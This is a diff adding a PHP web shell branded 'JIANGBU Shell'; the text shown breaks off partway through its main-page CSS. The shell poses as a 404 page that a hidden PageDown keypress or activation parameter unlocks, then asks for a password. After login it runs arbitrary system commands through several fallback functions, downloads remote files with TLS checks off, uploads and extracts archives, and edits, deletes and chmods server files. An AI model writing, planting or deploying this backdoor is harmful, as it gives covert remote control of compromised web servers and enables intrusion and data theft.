@@ -1,0 +1,1195 @@
+<?php
+declare(strict_types=1);
+
+$valid_password_hash = '$2a$12$vhWr.ukFL2AoIx77dcaI5ulEv2vY3IKD9cw1bqNVOYysPtcSRDs66';
+
+session_start();
+error_reporting(E_ALL);
+ini_set('display_errors', '0');
+ini_set('log_errors', '1');
+set_time_limit(0);
+ini_set("memory_limit", "512M");
+ini_set("max_execution_time", "600");
+ini_set("post_max_size", "500M");
+ini_set("upload_max_filesize", "500M");
+
+$session_name = 'SHELL_' . md5(__FILE__);
+@session_name($session_name);
+
+// ========== THEME ==========
+$allowed_themes = ['default','dracula','nord','monokai','matrix'];
+$current_theme = $_COOKIE['shell_theme'] ?? 'dracula';
+if (!in_array($current_theme, $allowed_themes, true)) $current_theme = 'dracula';
+
+// ========== CSRF ==========
+if (empty($_SESSION['csrf'])) {
+    $_SESSION['csrf'] = bin2hex(random_bytes(32));
+}
+$CSRF = $_SESSION['csrf'];
+
+function csrf_check(): void {
+    if (!isset($_POST['csrf']) || !hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'])) {
+        http_response_code(403);
+        exit('CSRF token invalid');
+    }
+}
+
+// ========== 404 TRICK (HMAC signed) ==========
+$secret = hash('sha256', __FILE__ . '|' . ($_SERVER['HTTP_HOST'] ?? ''));
+$expected_token = hash_hmac('sha256', 'activate', $secret);
+$shell_activated = isset($_COOKIE['shell_activated']) && hash_equals($expected_token, $_COOKIE['shell_activated']);
+$is_logged_in = !empty($_SESSION['logged_in']);
+
+if (isset($_GET['activate'])) {
+    setcookie('shell_activated', $expected_token, [
+        'expires' => time() + 3600,
+        'path' => '/',
+        'httponly' => true,
+        'samesite' => 'Strict',
+    ]);
+    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
+    exit;
+}
+
+if (!$shell_activated && !$is_logged_in) {
+    http_response_code(404);
+    echo '<!DOCTYPE html><html><head><title>404 Not Found</title>
+    <style>
+        body{background:#05050a;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:"Courier New",monospace;overflow:hidden}
+        body::before{content:"";position:fixed;inset:0;background:radial-gradient(circle at 30% 40%,rgba(155,89,182,.15),transparent 50%),radial-gradient(circle at 70% 60%,rgba(0,255,65,.1),transparent 50%),#05050a;z-index:0}
+        .err{text-align:center;z-index:1;position:relative}
+        .err h1{font-size:120px;background:linear-gradient(135deg,#ffd700,#9b59b6,#00ff41);-webkit-background-clip:text;background-clip:text;color:transparent;margin:0;font-weight:900;text-shadow:0 0 60px rgba(155,89,182,.4);animation:glitch 3s infinite}
+        .err p{font-size:18px;color:#00ff41;margin-top:10px;letter-spacing:6px;text-shadow:0 0 20px rgba(0,255,65,.5)}
+        @keyframes glitch{0%,100%{transform:translate(0)}92%{transform:translate(-2px,1px)}94%{transform:translate(2px,-1px)}96%{transform:translate(-1px,2px)}}
+    </style></head><body>
+        <div class="err"><h1>404</h1><p>PAGE NOT FOUND</p></div>
+        <script>document.addEventListener("keydown",e=>{if(e.key==="PageDown")location.href=location.pathname+"?activate=1"})</script>
+    </body></html>';
+    exit;
+}
+
+// ========== LOGIN ==========
+$login_attempts = $_SESSION['login_attempts'] ?? ['count' => 0, 'time' => time()];
+if (time() - $login_attempts['time'] > 300) {
+    $login_attempts = ['count' => 0, 'time' => time()];
+}
+
+if (isset($_POST['shell_pass'])) {
+    if ($login_attempts['count'] >= 5) {
+        $login_error = "TOO MANY ATTEMPTS. WAIT 5 MINUTES.";
+    } elseif (password_verify($_POST['shell_pass'], $valid_password_hash)) {
+        session_regenerate_id(true);
+        $_SESSION['logged_in'] = true;
+        $_SESSION['login_attempts'] = ['count' => 0, 'time' => time()];
+        $_SESSION['csrf'] = bin2hex(random_bytes(32));
+        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode(getcwd()));
+        exit;
+    } else {
+        $login_attempts['count']++;
+        $login_attempts['time'] = time();
+        $_SESSION['login_attempts'] = $login_attempts;
+        $login_error = "ACCESS DENIED! (" . (5 - $login_attempts['count']) . " attempts left)";
+    }
+}
+
+if (empty($_SESSION['logged_in'])) {
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>✦ JIANGBU Shell</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;800;900&family=Share+Tech+Mono&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{
+    --gold:#ffd700; --purple:#9b59b6; --green:#00ff41; --red:#ff3366;
+    --blue:#2c9cdb; --bg:#05050a; --panel:rgba(10,10,15,.85);
+    --border:rgba(155,89,182,.2); --text:#e8e8f0;
+    --accent-1:#ffd700; --accent-2:#9b59b6; --accent-3:#00ff41;
+    --font-mono:'Share Tech Mono',monospace;
+    --font-head:'Orbitron',monospace;
+}
+body[data-theme="dracula"]{
+    --bg:#282a36; --panel:rgba(40,42,54,.92);
+    --border:rgba(189,147,249,.25);
+    --gold:#f1fa8c; --purple:#bd93f9; --green:#50fa7b;
+    --red:#ff5555; --blue:#8be9fd; --text:#f8f8f2;
+    --accent-1:#ff79c6; --accent-2:#bd93f9; --accent-3:#50fa7b;
+}
+body[data-theme="nord"]{
+    --bg:#2e3440; --panel:rgba(46,52,64,.92);
+    --border:rgba(136,192,208,.25);
+    --gold:#ebcb8b; --purple:#b48ead; --green:#a3be8c;
+    --red:#bf616a; --blue:#88c0d0; --text:#eceff4;
+    --accent-1:#88c0d0; --accent-2:#81a1c1; --accent-3:#a3be8c;
+}
+body[data-theme="monokai"]{
+    --bg:#272822; --panel:rgba(39,40,34,.92);
+    --border:rgba(249,38,114,.25);
+    --gold:#f8f8f2; --purple:#ae81ff; --green:#a6e22e;
+    --red:#f92672; --blue:#66d9ef; --text:#f8f8f2;
+    --accent-1:#f92672; --accent-2:#ae81ff; --accent-3:#a6e22e;
+}
+body[data-theme="matrix"]{
+    --bg:#000000; --panel:rgba(0,10,0,.92);
+    --border:rgba(0,255,0,.3);
+    --gold:#00ff00; --purple:#00cc00; --green:#00ff00;
+    --red:#ff0000; --blue:#00ffaa; --text:#00ff00;
+    --accent-1:#00ff00; --accent-2:#00aa00; --accent-3:#00ff88;
+    --font-mono:'JetBrains Mono','Courier New',monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:var(--font-head);min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden;transition:background .3s,color .3s}
+body::before{content:"";position:fixed;inset:0;background:radial-gradient(circle at 20% 30%,rgba(155,89,182,.12),transparent 50%),radial-gradient(circle at 80% 70%,rgba(0,255,65,.08),transparent 50%),var(--bg);z-index:0;transition:background .3s}
+body[data-theme="dracula"]::before{background:radial-gradient(circle at 20% 30%,rgba(189,147,249,.15),transparent 50%),radial-gradient(circle at 80% 70%,rgba(255,121,198,.08),transparent 50%),var(--bg)}
+body[data-theme="nord"]::before{background:radial-gradient(circle at 20% 30%,rgba(136,192,208,.12),transparent 50%),radial-gradient(circle at 80% 70%,rgba(163,190,140,.08),transparent 50%),var(--bg)}
+body[data-theme="monokai"]::before{background:radial-gradient(circle at 20% 30%,rgba(249,38,114,.12),transparent 50%),radial-gradient(circle at 80% 70%,rgba(166,226,46,.08),transparent 50%),var(--bg)}
+body[data-theme="matrix"]::before{background:radial-gradient(circle at 50% 50%,rgba(0,255,0,.08),transparent 60%),#000}
+.matrix{position:fixed;inset:0;pointer-events:none;z-index:1;opacity:.15;font-family:monospace;color:var(--green);font-size:14px;line-height:1.2;overflow:hidden}
+.login-container{width:100%;max-width:440px;padding:20px;z-index:2;position:relative}
+.glass-card{background:var(--panel);backdrop-filter:blur(20px);border-radius:20px;padding:50px 40px;text-align:center;position:relative;overflow:hidden;box-shadow:0 0 80px rgba(155,89,182,.15),inset 0 0 60px rgba(155,89,182,.03)}
+.glass-card::before{content:"";position:absolute;inset:-2px;border-radius:22px;padding:2px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2),var(--accent-3),var(--accent-1));background-size:300% 300%;-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;animation:borderflow 4s linear infinite;pointer-events:none}
+@keyframes borderflow{0%{background-position:0% 50%}100%{background-position:300% 50%}}
+.title{font-size:32px;font-weight:900;background:linear-gradient(135deg,var(--accent-1),var(--accent-2),var(--accent-3));-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:8px;letter-spacing:5px;animation:hue 6s linear infinite}
+@keyframes hue{0%{filter:hue-rotate(0)}100%{filter:hue-rotate(360deg)}}
+.subtitle{font-size:10px;letter-spacing:8px;color:var(--purple);margin-bottom:35px;text-transform:uppercase;opacity:.8}
+.error-msg{background:rgba(255,0,51,.1);border:1px solid var(--red);color:var(--red);padding:12px;margin-bottom:25px;border-radius:8px;font-size:11px;font-weight:700;letter-spacing:1px;animation:shake .4s}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
+.input-group{margin-bottom:25px;position:relative}
+.input-group input{width:100%;padding:16px 24px;background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:14px;font-family:var(--font-head);text-align:center;font-weight:700;letter-spacing:3px;transition:all .3s}
+.input-group input:focus{outline:none;border-color:var(--accent-1);background:rgba(255,255,255,.05);box-shadow:0 0 40px var(--accent-2)}
+.input-group input::placeholder{color:rgba(255,255,255,.25);letter-spacing:2px}
+.login-btn{width:100%;padding:16px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2),var(--accent-3));background-size:200% 200%;border:none;border-radius:10px;color:var(--bg);font-size:14px;font-weight:900;font-family:var(--font-head);cursor:pointer;letter-spacing:4px;transition:all .3s;animation:gradient 3s ease infinite}
+@keyframes gradient{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+.login-btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px var(--accent-2)}
+.footer{margin-top:30px;color:var(--gold);opacity:.5;font-size:9px;letter-spacing:3px}
+.scanline{position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(155,89,182,.03) 2px,rgba(155,89,182,.03) 4px);pointer-events:none;z-index:3}
+.theme-switcher{position:fixed;top:20px;right:20px;z-index:10;display:flex;gap:4px;background:rgba(0,0,0,.4);padding:5px;border-radius:10px;border:1px solid var(--border);backdrop-filter:blur(10px)}
+.theme-btn{background:transparent;border:none;font-size:16px;cursor:pointer;padding:6px 8px;border-radius:6px;transition:.2s;opacity:.5;line-height:1}
+.theme-btn:hover{opacity:1;background:rgba(255,255,255,.1);transform:scale(1.15)}
+.theme-btn.active{opacity:1;background:var(--accent-2);box-shadow:0 0 12px var(--accent-1)}
+</style>
+</head>
+<body data-theme="<?= htmlspecialchars($current_theme, ENT_QUOTES) ?>">
+<div class="scanline"></div>
+<div class="matrix" id="matrix"></div>
+
+<div class="theme-switcher">
+    <button class="theme-btn" data-set-theme="default" title="Nexus">✦</button>
+    <button class="theme-btn" data-set-theme="dracula" title="Dracula">🧛</button>
+    <button class="theme-btn" data-set-theme="nord" title="Nord">❄️</button>
+    <button class="theme-btn" data-set-theme="monokai" title="Monokai">🎨</button>
+    <button class="theme-btn" data-set-theme="matrix" title="Matrix">🟢</button>
+</div>
+
+<div class="login-container">
+    <div class="glass-card">
+        <div class="title">✦ JIANGBU</div>
+        <div class="subtitle">Secure Shell Interface</div>
+        <?php if (isset($login_error)): ?>
+        <div class="error-msg"><?= htmlspecialchars($login_error, ENT_QUOTES) ?></div>
+        <?php endif; ?>
+        <form method="POST">
+            <div class="input-group">
+                <input type="password" name="shell_pass" placeholder="ENTER PASSWORD" autocomplete="off" autofocus>
+            </div>
+            <button type="submit" class="login-btn">ACCESS</button>
+        </form>
+        <div class="footer">[ SYSTEM SECURE ]</div>
+    </div>
+</div>
+<script>
+const chars='アイウエオカキクケコ01ｱｲｳｴｵNEXUS';
+const m=document.getElementById('matrix');
+let html='';
+for(let i=0;i<80;i++){let s='';for(let j=0;j<40;j++)s+=chars[Math.floor(Math.random()*chars.length)];html+=s+'<br>';}
+m.innerHTML=html;
+
+// Theme switcher
+document.querySelectorAll('.theme-btn').forEach(b => {
+    if (b.dataset.setTheme === document.body.dataset.theme) b.classList.add('active');
+    b.addEventListener('click', () => {
+        const t = b.dataset.setTheme;
+        document.body.dataset.theme = t;
+        document.cookie = 'shell_theme=' + t + ';path=/;max-age=31536000;SameSite=Strict';
+        document.querySelectorAll('.theme-btn').forEach(x => x.classList.remove('active'));
+        b.classList.add('active');
+    });
+});
+</script>
+</body>
+</html>
+<?php
+    exit;
+}
+
+// ========== UTILITY ==========
+function getCurrentDir(): string {
+    static $dir = null;
+    if ($dir === null) {
+        $default = function_exists('getcwd') ? getcwd() : dirname(__FILE__);
+        $candidate = $_GET['d'] ?? $_SESSION['cwd'] ?? $default;
+        $real = @realpath($candidate);
+        if ($real === false || !is_dir($real)) $real = @realpath($default);
+        if ($real === false) $real = dirname(__FILE__);
+        $dir = rtrim(str_replace('\\', '/', $real), '/') . '/';
+        $_SESSION['cwd'] = $dir;
+    }
+    return $dir;
+}
+
+function formatBytes($bytes, int $precision = 2): string {
+    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
+    $bytes = max((float)$bytes, 0);
+    $pow = $bytes > 0 ? (int)floor(log($bytes) / log(1024)) : 0;
+    $pow = min($pow, count($units) - 1);
+    return round($bytes / pow(1024, $pow), $precision) . ' ' . $units[$pow];
+}
+
+function sanitizeFilename(string $name): string {
+    $name = basename($name);
+    $name = preg_replace('/[\x00-\x1F\x7F\/\\\\]/', '', $name);
+    $name = trim($name, '._- ');
+    if ($name === '') $name = 'file_' . time();
+    return $name;
+}
+
+function safePath(string $baseDir, string $name): ?string {
+    $name = sanitizeFilename($name);
+    $target = rtrim($baseDir, '/') . '/' . $name;
+    $real = @realpath($target);
+    if ($real !== false) {
+        $baseReal = rtrim(@realpath($baseDir) ?: $baseDir, '/');
+        if (strpos($real, $baseReal) !== 0) return null;
+        return $real;
+    }
+    return $target;
+}
+
+function executeCommand(string $cmd, ?string $cwd = null): string {
+    $cwd = $cwd ?: getCurrentDir();
+    $cmd = trim($cmd);
+    if ($cmd === '') return '';
+
+    if (preg_match('/^\s*cd\s+(.+)$/i', $cmd, $m)) {
+        $newDir = trim($m[1], " \t\"'");
+        if ($newDir === '~') $newDir = $_SERVER['HOME'] ?? '/tmp';
+        if ($newDir[0] !== '/' && $newDir !== '..' && strpos($newDir, './') !== 0) {
+            $newDir = $cwd . $newDir;
+        }
+        $real = @realpath($newDir);
+        if ($real && is_dir($real)) {
+            $_SESSION['cwd'] = rtrim(str_replace('\\', '/', $real), '/') . '/';
+            return "Directory changed to: {$real}";
+        }
+        return "Directory not found: {$newDir}";
+    }
+
+    if (preg_match('/^(wget|curl)/i', $cmd)) return handleDownloadCommand($cmd, $cwd);
+
+    $fullCmd = 'cd ' . escapeshellarg($cwd) . ' 2>/dev/null; ' . $cmd . ' 2>&1';
+    $output = '';
+    if (function_exists('shell_exec')) $output = @shell_exec($fullCmd);
+    if (empty($output) && function_exists('exec')) { @exec($fullCmd, $o, $c); $output = implode("\n", $o); }
+    if (empty($output) && function_exists('system')) { ob_start(); @system($fullCmd, $c); $output = ob_get_clean(); }
+    if (empty($output) && function_exists('passthru')) { ob_start(); @passthru($fullCmd, $c); $output = ob_get_clean(); }
+    if (empty($output) && function_exists('proc_open')) {
+        $d = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+        $p = @proc_open($fullCmd, $d, $pipes, $cwd);
+        if (is_resource($p)) {
+            $output = stream_get_contents($pipes[1]);
+            $err = stream_get_contents($pipes[2]);
+            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
+            proc_close($p);
+            if ($err && empty($output)) $output = $err;
+        }
+    }
+    return trim($output) !== '' ? $output : '(no output)';
+}
+
+function handleDownloadCommand(string $cmd, string $cwd): string {
+    preg_match('/https?:\/\/[^\s]+/i', $cmd, $m);
+    $url = $m[0] ?? '';
+    if (!$url) return "Error: No URL found";
+
+    $filename = null;
+    if (preg_match('/--output-document[= ]([^\s]+)/i', $cmd, $mm)) $filename = sanitizeFilename($mm[1]);
+    elseif (preg_match('/-O\s+([^\s]+)/', $cmd, $mm)) $filename = sanitizeFilename($mm[1]);
+    else {
+        $base = basename(parse_url($url, PHP_URL_PATH) ?? '');
+        $filename = $base ? sanitizeFilename($base) : 'downloaded_' . time() . '.bin';
+    }
+
+    $target = rtrim($cwd, '/') . '/' . $filename;
+    $content = false;
+
+    if (ini_get('allow_url_fopen')) {
+        $ctx = stream_context_create([
+            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
+            'http' => ['timeout' => 60, 'user_agent' => 'Mozilla/5.0'],
+        ]);
+        $content = @file_get_contents($url, false, $ctx);
+    }
+    if ($content === false && function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 60,
+            CURLOPT_USERAGENT => 'Mozilla/5.0',
+        ]);
+        $content = curl_exec($ch);
+        curl_close($ch);
+    }
+    if ($content !== false && @file_put_contents($target, $content)) {
+        @chmod($target, 0644);
+        return "Downloaded: {$filename} (" . formatBytes(strlen($content)) . ")";
+    }
+    return "Download failed: {$url}";
+}
+
+function handleUpload(array $files, string $targetDir): array {
+    if (isset($files['name']) && !is_array($files['name'])) {
+        $files = ['name' => [$files['name']], 'tmp_name' => [$files['tmp_name']], 'error' => [$files['error']], 'size' => [$files['size']]];
+    }
+    $uploaded = [];
+    if (!isset($files['name'])) return $uploaded;
+
+    foreach ($files['name'] as $i => $name) {
+        if (($files['error'][$i] ?? 1) !== UPLOAD_ERR_OK) continue;
+        if (!is_uploaded_file($files['tmp_name'][$i])) continue;
+        $clean = sanitizeFilename($name);
+        $target = rtrim($targetDir, '/') . '/' . $clean;
+        if (@move_uploaded_file($files['tmp_name'][$i], $target)) {
+            @chmod($target, 0644);
+            $uploaded[] = $clean;
+        }
+    }
+    return $uploaded;
+}
+
+function extractArchive(string $zipPath, string $extractTo, bool $deleteAfter = true): array {
+    $results = [];
+    if (!file_exists($zipPath)) return ["Archive not found: " . basename($zipPath)];
+    if (!is_dir($extractTo)) @mkdir($extractTo, 0755, true);
+
+    $baseReal = rtrim(@realpath($extractTo) ?: $extractTo, '/');
+    $extracted = false;
+
+    if (class_exists('ZipArchive')) {
+        $zip = new ZipArchive();
+        if ($zip->open($zipPath) === true) {
+            $count = 0;
+            for ($i = 0; $i < $zip->numFiles; $i++) {
+                $entry = $zip->getNameIndex($i);
+                $targetPath = $baseReal . '/' . $entry;
+                $real = @realpath(dirname($targetPath));
+                if ($real === false) {
+                    $real = dirname($targetPath);
+                }
+                $normalized = str_replace('\\', '/', $real);
+                if (strpos($normalized, $baseReal) !== 0 && strpos($normalized . '/', $baseReal) !== 0) {
+                    continue;
+                }
+                $zip->extractTo($extractTo, $entry);
+                $count++;
+            }
+            $zip->close();
+            $results[] = "Extracted: {$count} files";
+            $extracted = true;
+        }
+    }
+    if (!$extracted && function_exists('shell_exec')) {
+        $cmd = 'cd ' . escapeshellarg($extractTo) . ' && unzip -o ' . escapeshellarg($zipPath) . ' 2>&1';
+        $o = @shell_exec($cmd);
+        if ($o && (stripos($o, 'inflating') !== false || stripos($o, 'extracting') !== false)) {
+            $results[] = "Extracted via CLI";
+            $extracted = true;
+        }
+    }
+    if ($extracted && $deleteAfter) { @unlink($zipPath); $results[] = "Original archive deleted"; }
+    elseif (!$extracted) $results[] = "Failed to extract";
+    return $results;
+}
+
+function deleteRecursive(string $path): bool {
+    if (is_link($path) || is_file($path)) return @unlink($path);
+    if (is_dir($path)) {
+        $items = @scandir($path);
+        if ($items) {
+            foreach ($items as $it) {
+                if ($it === '.' || $it === '..') continue;
+                deleteRecursive($path . '/' . $it);
+            }
+        }
+        return @rmdir($path);
+    }
+    return false;
+}
+
+function fileIcon(string $name): array {
+    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
+    $map = [
+        'php' => ['fa-php', '#9b59b6'],
+        'html' => ['fa-html5', '#ff6b3d'],
+        'css' => ['fa-css3-alt', '#2c9cdb'],
+        'js' => ['fa-js', '#ffd700'],
+        'json' => ['fa-code', '#ffd700'],
+        'zip' => ['fa-file-archive', '#ff3366'],
+        'rar' => ['fa-file-archive', '#ff3366'],
+        'gz' => ['fa-file-archive', '#ff3366'],
+        'txt' => ['fa-file-alt', '#00ff41'],
+        'log' => ['fa-file-alt', '#00ff41'],
+        'pdf' => ['fa-file-pdf', '#ff3366'],
+        'doc' => ['fa-file-word', '#2c9cdb'],
+        'docx' => ['fa-file-word', '#2c9cdb'],
+        'xls' => ['fa-file-excel', '#00ff41'],
+        'xlsx' => ['fa-file-excel', '#00ff41'],
+        'jpg' => ['fa-file-image', '#ffd700'],
+        'jpeg' => ['fa-file-image', '#ffd700'],
+        'png' => ['fa-file-image', '#ffd700'],
+        'gif' => ['fa-file-image', '#ffd700'],
+        'svg' => ['fa-file-image', '#ffd700'],
+        'mp3' => ['fa-file-audio', '#9b59b6'],
+        'mp4' => ['fa-file-video', '#9b59b6'],
+        'avi' => ['fa-file-video', '#9b59b6'],
+        'sh' => ['fa-terminal', '#00ff41'],
+        'py' => ['fa-python', '#ffd700'],
+        'sql' => ['fa-database', '#2c9cdb'],
+    ];
+    return $map[$ext] ?? ['fa-file', '#8899aa'];
+}
+
+// ========== MAIN ==========
+$currentDir = getCurrentDir();
+$messages = $_SESSION['messages'] ?? [];
+$commandOutput = $_SESSION['command_output'] ?? '';
+$editFile = null;
+$editContent = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    csrf_check();
+
+    if (isset($_POST['create_action'])) {
+        $name = sanitizeFilename($_POST['name'] ?? '');
+        $type = $_POST['type'] ?? 'file';
+        $content = $_POST['content'] ?? '';
+        $path = safePath($currentDir, $name);
+        if ($path && $name) {
+            if ($type === 'file') {
+                if (@file_put_contents($path, $content) !== false) { @chmod($path, 0644); $messages[] = "File created: {$name}"; }
+                else $messages[] = "Failed to create file: {$name}";
+            } else {
+                if (@mkdir($path, 0755, true)) $messages[] = "Folder created: {$name}";
+                else $messages[] = "Failed to create folder: {$name}";
+            }
+        }
+    }
+
+    if (isset($_FILES['files']['name'])) {
+        $up = handleUpload($_FILES['files'], $currentDir);
+        if ($up) $messages[] = "Uploaded: " . implode(', ', $up);
+    }
+
+    if (isset($_FILES['archive']['error']) && $_FILES['archive']['error'] === UPLOAD_ERR_OK && is_uploaded_file($_FILES['archive']['tmp_name'])) {
+        $tmpSave = $currentDir . 'tmp_' . time() . '_' . bin2hex(random_bytes(4)) . '.zip';
+        if (@copy($_FILES['archive']['tmp_name'], $tmpSave)) {
+            $messages = array_merge($messages, extractArchive($tmpSave, $currentDir, true));
+        }
+    }
+
+    if (!empty($_POST['download_url'])) {
+        $url = trim($_POST['download_url']);
+        $fn = !empty($_POST['download_name']) ? sanitizeFilename($_POST['download_name']) : '';
+        $cmd = 'wget ' . $url . ($fn ? ' -O ' . $fn : '');
+        $messages[] = handleDownloadCommand($cmd, $currentDir);
+    }
+
+    if (isset($_POST['command']) && trim($_POST['command']) !== '') {
+        $commandOutput = executeCommand($_POST['command'], $currentDir);
+        $currentDir = getCurrentDir();
+    }
+
+    if (isset($_POST['edit_content'], $_POST['edit_file'])) {
+        $target = safePath($currentDir, $_POST['edit_file']);
+        if ($target && @file_put_contents($target, $_POST['edit_content']) !== false) {
+            $messages[] = "Saved: " . basename($target);
+        }
+    }
+
+    if (!empty($_POST['delete_selected']) && !empty($_POST['selected_items']) && is_array($_POST['selected_items'])) {
+        $deleted = 0;
+        foreach ($_POST['selected_items'] as $item) {
+            $target = safePath($currentDir, $item);
+            if ($target && file_exists($target)) {
+                if (deleteRecursive($target)) $deleted++;
+            }
+        }
+        $messages[] = "Deleted {$deleted} item(s)";
+    }
+
+    if (!empty($_POST['rename_old']) && !empty($_POST['rename_new'])) {
+        $old = safePath($currentDir, $_POST['rename_old']);
+        $new = safePath($currentDir, $_POST['rename_new']);
+        if ($old && $new && file_exists($old) && !file_exists($new) && @rename($old, $new)) {
+            $messages[] = "Renamed: " . basename($old) . " → " . basename($new);
+        } else {
+            $messages[] = "Rename failed";
+        }
+    }
+
+    if (!empty($_POST['chmod_file']) && !empty($_POST['chmod_value'])) {
+        if (preg_match('/^0?[0-7]{3,4}$/', $_POST['chmod_value'])) {
+            $target = safePath($currentDir, $_POST['chmod_file']);
+            $perms = octdec($_POST['chmod_value']);
+            if ($target && file_exists($target) && @chmod($target, $perms)) {
+                $messages[] = "CHMOD " . basename($target) . " → " . $_POST['chmod_value'];
+            }
+        } else {
+            $messages[] = "Invalid CHMOD value";
+        }
+    }
+
+    if (!empty($_POST['compress_target'])) {
+        $target = safePath($currentDir, $_POST['compress_target']);
+        if ($target && is_dir($target)) {
+            $zipName = basename($target) . '_' . time() . '.zip';
+            $zipPath = $currentDir . $zipName;
+            if (class_exists('ZipArchive')) {
+                $zip = new ZipArchive();
+                if ($zip->open($zipPath, ZipArchive::CREATE) === true) {
+                    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS));
+                    foreach ($rii as $f) {
+                        $local = substr($f->getPathname(), strlen(dirname($target)) + 1);
+                        $zip->addFile($f->getPathname(), $local);
+                    }
+                    $zip->close();
+                    $messages[] = "Compressed: {$zipName}";
+                }
+            }
+        }
+    }
+
+    $_SESSION['messages'] = $messages;
+    $_SESSION['command_output'] = $commandOutput;
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
+    exit;
+}
+
+// GET actions
+if (isset($_GET['delete'])) {
+    $target = safePath($currentDir, $_GET['delete']);
+    if ($target && file_exists($target) && deleteRecursive($target)) {
+        $messages[] = "Deleted: " . basename($target);
+        $_SESSION['messages'] = $messages;
+    }
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
+    exit;
+}
+if (isset($_GET['extract'])) {
+    $target = safePath($currentDir, $_GET['extract']);
+    if ($target && strtolower(pathinfo($target, PATHINFO_EXTENSION)) === 'zip') {
+        $messages = array_merge($messages, extractArchive($target, $currentDir, true));
+        $_SESSION['messages'] = $messages;
+    }
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
+    exit;
+}
+if (isset($_GET['download'])) {
+    $target = safePath($currentDir, $_GET['download']);
+    if ($target && is_file($target)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
+        header('Content-Length: ' . filesize($target));
+        readfile($target);
+        exit;
+    }
+}
+if (isset($_GET['edit'])) {
+    $target = safePath($currentDir, $_GET['edit']);
+    if ($target && is_file($target) && filesize($target) < 5 * 1024 * 1024) {
+        $editFile = basename($target);
+        $editContent = (string)@file_get_contents($target);
+    }
+}
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+$_SESSION['messages'] = $messages;
+
+$showHidden = !empty($_GET['hidden']);
+$items = @scandir($currentDir) ?: [];
+$dirs = [];
+$files = [];
+$totalSize = 0;
+foreach ($items as $item) {
+    if ($item === '.' || $item === '..') continue;
+    if (!$showHidden && $item[0] === '.') continue;
+    $path = $currentDir . $item;
+    if (is_dir($path)) $dirs[] = $item;
+    else { $files[] = $item; $totalSize += (int)@filesize($path); }
+}
+sort($dirs);
+sort($files);
+
+$serverInfo = [
+    'OS' => PHP_OS,
+    'PHP' => PHP_VERSION,
+    'User' => function_exists('get_current_user') ? (get_current_user() ?: 'n/a') : 'n/a',
+    'CWD' => $currentDir,
+    'Free' => function_exists('disk_free_space') ? @formatBytes((float)@disk_free_space($currentDir)) : 'n/a',
+];
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>✦ JiangBU Shell</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;800;900&family=Share+Tech+Mono&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+    --gold:#ffd700; --purple:#9b59b6; --green:#00ff41; --red:#ff3366;
+    --blue:#2c9cdb; --bg:#05050a; --panel:rgba(10,10,15,.85);
+    --border:rgba(155,89,182,.2); --text:#e8e8f0;
+    --accent-1:#ffd700; --accent-2:#9b59b6; --accent-3:#00ff41;
+    --font-mono:'Share Tech Mono',monospace;
+    --font-head:'Orbitron',monospace;
+}
+body[data-theme="dracula"]{
+    --bg:#282a36; --panel:rgba(40,42,54,.75);
+    --border:rgba(189,147,249,.25);
+    --gold:#f1fa8c; --purple:#bd93f9; --green:#50fa7b;
+    --red:#ff5555; --blue:#8be9fd; --text:#f8f8f2;
+    --accent-1:#ff79c6; --accent-2:#bd93f9; --accent-3:#50fa7b;
+}
+body[data-theme="nord"]{
+    --bg:#2e3440; --panel:rgba(46,52,64,.75);
+    --border:rgba(136,192,208,.25);
+    --gold:#ebcb8b; --purple:#b48ead; --green:#a3be8c;
+    --red:#bf616a; --blue:#88c0d0; --text:#eceff4;
